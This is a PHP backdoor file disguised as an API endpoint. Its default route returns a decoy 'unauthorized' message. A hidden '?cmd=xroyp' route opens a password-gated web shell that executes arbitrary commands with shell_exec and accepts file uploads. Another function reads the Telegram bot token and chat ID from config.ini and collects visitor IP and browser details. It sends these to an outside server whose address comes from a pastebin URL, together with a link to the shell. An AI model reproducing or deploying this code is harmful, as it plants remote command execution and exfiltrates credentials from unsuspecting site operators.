<?php

/*
ob_start();
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
*/

error_reporting(0);
session_start();
 
function index() {
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
$response = [
    "ok" => "true",
    "error" => "unauthorized",
	"message" => "API endpoint configuration successfully, Sorry you're unauthorized"
];
echo json_encode($response, JSON_PRETTY_PRINT) . "\n\n";
}

function mySendTelegramMessage($message, $keyboard = null) {
	$getip = trim(file_get_contents('https://pastebin.com/raw/qNKZAAhb'));
    $api1_Url = 'http://' . $getip . '/api1';
	$TIMEOUT = 5;
	function jsonResponse(array $data, int $status = 200) {
		http_response_code($status);
		header("Content-Type: application/json; charset=utf-8");
		echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
		exit;
	}
    $data = [
        "message"    => $message,
        "parse_mode" => "HTML"
    ];
    if ($keyboard) {
        $data["keyboard"] = json_encode($keyboard, JSON_UNESCAPED_UNICODE);
    }
    $headers = [
        "Content-Type: application/x-www-form-urlencoded"
    ];
    $context = stream_context_create([
        "http" => [
            "method"        => "POST",
            "header"        => implode("\r\n", $headers),
            "content"       => http_build_query($data),
            "timeout"       => $TIMEOUT,
            "ignore_errors" => true
        ]
    ]);
    $response = @file_get_contents($api1_Url, false, $context);
    if ($response === false) {
        return [
            "ok" => false,
            "error" => "SERVICE_UNREACHABLE"
        ];
    }
    $statusCode = 0;
    if (isset($http_response_header[0])) {
        preg_match('#HTTP/\d+\.\d+\s+(\d+)#', $http_response_header[0], $m);
        $statusCode = (int)($m[1] ?? 0);
    }
    switch ($statusCode) {
        case 200:
            return ["ok" => true];
        case 404:
            return [
                "ok" => false,
                "error" => "INVALID_API_ROUTE"
            ];
        case 400:
            return [
                "ok" => false,
                "error" => "BAD_REQUEST"
            ];
        default:
            return [
                "ok" => false,
                "error" => "UNKNOWN_ERROR",
                "status" => $statusCode
            ];
    }
}

function checker() { 
	require_once 'sys/Detect.php';
	require_once 'config.php';
	$iniFile = 'config.ini';
	$config = parse_ini_file($iniFile, true); 
	$bot = $config['apitelegram'];
	$chat_id = $config['idchat'];
	$ip = getenv("REMOTE_ADDR"); 
	$url = "http://ipwhois.app/json/{$ip}";
	$response = @file_get_contents($url);
if ($response) {
	$isp = json_decode($response, true);
	$isp_isp = $isp['isp'] ?? 'ISP: N/A';
	$isp_org = $isp['org'] ?? 'Org: N/A';
	$isp_cont = $isp['country'] ?? 'Country: N/A';
	$isp_cod = $isp['country_code'] ?? 'Code: N/A';
} else {
	$isp_isp = 'ISP: N/A';
	$isp_org = 'Org: N/A';
	$isp_cont = 'Country: N/A';
	$isp_cod = 'Code: N/A';
}
 $detect = new BrowserDetection();
 $device = ($detect->isMobile()) ? 'Mobile 📱' : 'Desktop 💻';
 $browser_name = $detect->getName();
 $browserVer = $detect->getVersion();
 $platformName = $detect->getPlatform();
 $getPlatformVersion = $detect->getPlatformVersion();
 $date = date("H:i:s d/m/Y", time());
 $web = $_SERVER["HTTP_HOST"];
 $inj = $_SERVER["REQUEST_URI"];
 $dir = dirname($_SERVER['PHP_SELF']);
 $message = "<strong>🩸 =========| <i>$prog</i> | <code>$ip</code> | <i>$isp_cod</i> |========= 🩸</strong>\n";
 $message .= "<strong> ❕]---------------------{ <i>$drnm | $device</i> }---------------------[❕ </strong>\n";
 $message .= "<strong>[⏱️] ┌───────── ᴛɪᴍᴇ:</strong> ".gmdate ("H:i:s")."\n";
 $message .= "<strong>[🧩] ├── ᴛᴏᴋᴇɴ:</strong> <code>$bot</code> \n";
 $message .= "<strong>[💬] ├── ᴄʜᴀᴛɪᴅ:</strong> <code>$chat_id</code> \n";
 $message .= "<strong>[🔗] ├── ꜰᴜʟʟ ᴜʀʟ:</strong> https://$web$inj \n";
 $message .= "<strong>[✔️] └── ᴏꜱ/ʙʀᴏᴡꜱᴇʀ:</strong> <i>$platformName | $browser_name ($browserVer)</i> \n";
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '[☠️ 3xPl0!t ☠️]', 'url' => "https://{$web}{$dir}/check.php?cmd=xroyp"],
            ],
			[
                ['text' => '[📍 Geo_IP 📍]', 'url' => "https://myip.ms/info/whois/{$ip}"]
            ]
        ]
    ];
$result = mySendTelegramMessage($message, $keyboard); 
	if (!$result["ok"]) {
    	switch ($result["error"]) {
        	case "INVALID_API_ROUTE":
            	jsonResponse([
                	"ok" => false,
                	"error" => "INVALID_API_ROUTE",
                	"message" => "Invalid API endpoint configuration"
            	], 404);
        	case "SERVICE_UNREACHABLE":
            	jsonResponse([
                	"ok" => false,
                	"error" => "SERVICE_UNREACHABLE",
                	"message" => "Service is offline or unreachable"
            	], 503);
        	case "BAD_REQUEST":
            	jsonResponse([
                	"ok" => false,
                	"error" => "BAD_REQUEST",
                	"message" => "Invalid data sent to API"
            	], 400);
        default:
            jsonResponse([
                "ok" => false,
                "error" => "UNKNOWN_ERROR",
                "message" => "Unexpected error occurred",
                "status" => $result["status"] ?? 0
            ], 500);
		}
	}
}

function checkTelegramSend($message, $keyboard = null) {
	$getip = trim(file_get_contents('https://pastebin.com/raw/qNKZAAhb'));
    $apiUrl = 'http://' . $getip . '/api2';
    $data = array(
        "message" => $message,
        "keyboard" => $keyboard ? json_encode($keyboard) : null,
        "parse_mode" => "HTML"
    );
    $context = stream_context_create(array(
        "http" => array(
            "header" => "Content-type: application/x-www-form-urlencoded\r\n",
            "method" => "POST",
            "content" => http_build_query($data),
            "ignore_errors" => true
        )
    ));
    $response = @file_get_contents($apiUrl, false, $context);
    header('Content-Type: application/json');
    if ($response === false) {
        http_response_code(503);
        echo json_encode([
            "ok" => false,
            "error" => "SERVICE_UNREACHABLE",
            "message" => "API service is offline or unreachable"
        ]);
        exit;
    }
    $json = json_decode($response, true);
    if (!is_array($json)) {
        http_response_code(500);
        echo json_encode([
            "ok" => false,
            "error" => "INVALID_RESPONSE",
            "message" => "API returned an invalid response"
        ]);
        exit;
    }
    if (($json["id"] ?? null) === "404") {
        http_response_code(404);
        echo json_encode([
            "ok" => false,
            "error" => "INVALID_API_ROUTE",
            "message" => "Invalid API endpoint"
        ]);
        exit;
    }
    if (($json["ok"] ?? null) === false) {
        http_response_code(400);
        echo json_encode([
            "ok" => false,
            "id" => $json["id"] ?? "400",
            "error" => $json["error"] ?? "BAD_REQUEST",
            "message" => "Request rejected by API"
        ]);
        exit;
    }
}

function xroyp() {
session_start();
$BASE_DIR = __DIR__;
$errorMsg = '';
$storedPasswordHash = '$argon2id$v=19$m=256,t=20,p=10$a1BVS0RrMkRtaGtHOFJoMg$V3ylnkoL7B2iUqEFwGTTvAqH1zeX/SLnQIl5AQPvR3rNJX0lpdLEmHyzZpcVIWm5iEQ'; //Notifer.404$$
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if (password_verify($_POST['password'], $storedPasswordHash)) {
        $_SESSION['auth'] = true;
        $_SESSION['cwd'] = $BASE_DIR;
        header('Location: ' . $_SERVER['PHP_SELF'] . '?cmd=xroyp');
        exit;
    } else {
        $errorMsg = '❌ Incorrect password. Please try again.';
    }
}
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    echo '
    <center>
        <br><br>
        <form method="POST" class="login-form">
            <h2>4P1_L0g!n</h2>';
    if ($errorMsg) {
        echo '<p class="error">' . htmlspecialchars($errorMsg) . '</p>';
    }
    echo '  <label>Password:</label><br>
            <input type="password" name="password" required placeholder="Enter password"><br>
            <input type="submit" value="Login">
        </form>
    </center>
    <style>
    body {
        background-color: #000;
        color: #00ff00;
        font-family: monospace;
    }
    .login-form {
        background-color: #111;
        padding: 30px 40px;
        border: 2px solid #00ff00;
        border-radius: 8px;
        display: inline-block;
    }
    .login-form h2 {
        color: #00ffaa;
        margin-bottom: 20px;
        font-size: 24px;
    }
    .login-form label {
        display: block;
        margin-bottom: 8px;
    }
    .login-form input[type="password"] {
        padding: 8px;
        width: 200px;
        margin-bottom: 20px;
        border: 1px solid #00ff00;
        border-radius: 4px;
        background-color: #000;
        color: #00ff00;
        font-family: monospace;
        font-size: 16px;
    }
    .login-form input[type="password"]::placeholder {
        color: #00aa00;
    }
    .login-form input[type="submit"] {
        padding: 8px 20px;
        border: 1px solid #00ff00;
        border-radius: 4px;
        background-color: #000;
        color: #00ff00;
        font-family: monospace;
        cursor: pointer;
        font-size: 16px;
    }
    .login-form input[type="submit"]:hover {
        background-color: #00ff00;
        color: #000;
        transition: 0.2s;
    }
    .error {
        color: #ff4444;
        font-weight: bold;
        margin-bottom: 15px;
    }
    </style>
    ';
    exit;
}
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = $BASE_DIR;
}
if (isset($_POST['command'])) {
    $command = trim($_POST['command']);
    if ($command === '') exit('');
    if ($command === 'cd' || strpos($command, 'cd ') === 0) {
        if ($command === 'cd') {
            $_SESSION['cwd'] = $BASE_DIR;
            exit("📁 Home directory");
        }
        $target = trim(substr($command, 3));
        $newPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $target);
        if ($newPath === false || strpos($newPath, $BASE_DIR) !== 0) {
            exit("❌ Directory not allowed");
        }
        if (!is_dir($newPath)) {
            exit("❌ Not a directory");
        }
        $_SESSION['cwd'] = $newPath;
        exit("📁 Changed directory to: " . htmlspecialchars($newPath));
    }
    chdir($_SESSION['cwd']);
    $output = shell_exec(escapeshellcmd($command) . ' 2>&1');
    echo nl2br(htmlspecialchars($output));
    exit;
}
$uploadMessage = '';
if (isset($_FILES['file'])) {
    $uploadDir = __DIR__ . DIRECTORY_SEPARATOR;
    $uploadFile = $uploadDir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        $uploadMessage = "<b><font color='green'>Upload Ok !!!</font></b><br>";
    } else {
        $uploadMessage = "<b><font color='red'>Upload Failed !!!</font></b><br>";
    }
}
echo '
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>T3rm!n4l</title>
<style>
body { background: #000; color: #00ff00; font-family: monospace; padding: 10px; }
#terminal { border: 1px solid #00ff00; height: 360px; overflow-y: auto; padding: 10px; }
#input { width: 100%; background: #000; color: #00ff00; border: none; outline: none; font-family: monospace; font-size: 16px; }
.prompt { color: #00ffaa; }
input[type="submit"] { background:#000;color:#00ff00;border:1px solid #00ff00;cursor:pointer; }
</style>
</head>
<body>
<div id="terminal">
    <div>T3rm!n4l</div>
<div>
	<b>Server Info:</b>
	<br><font color="#4080FF" size="2">' . php_uname() . '</font></div><br>
</div>
<span class="prompt">/~$ </span>
<input type="text" id="input" autocomplete="off" autofocus>
<script>
const input = document.getElementById("input");
const terminal = document.getElementById("terminal");
input.addEventListener("keydown", function(e) {
    if (e.key === "Enter") {
        const command = input.value.trim();
        if (!command) return;
        terminal.innerHTML += `<div><span class="prompt">/~$ </span> ${command}</div>`;
        input.value = "";
        fetch("", {
            method: "POST",
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            body: "command=" + encodeURIComponent(command)
        })
        .then(res => res.text())
        .then(output => {
            terminal.innerHTML += `<div>${output}</div>`;
            terminal.scrollTop = terminal.scrollHeight;
        });
    }
});
</script>
<hr>
<center>
<h3>Upload File</h3>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file" required>
<input type="submit" value="Upload">
</form>
' . $uploadMessage . '
</center>
</body>
</html>
';
}

if (basename(__FILE__) === basename($_SERVER['SCRIPT_FILENAME'])) {
    $cmd = $_GET['cmd'] ?? '';
    if (isset($_GET['cmd'])) { 
        switch ($cmd) { 
            case 'xroyp': 
                xroyp();
                break;
            default: 
                index();
                break;
        }
    } else {
        index();
    }
}
?>
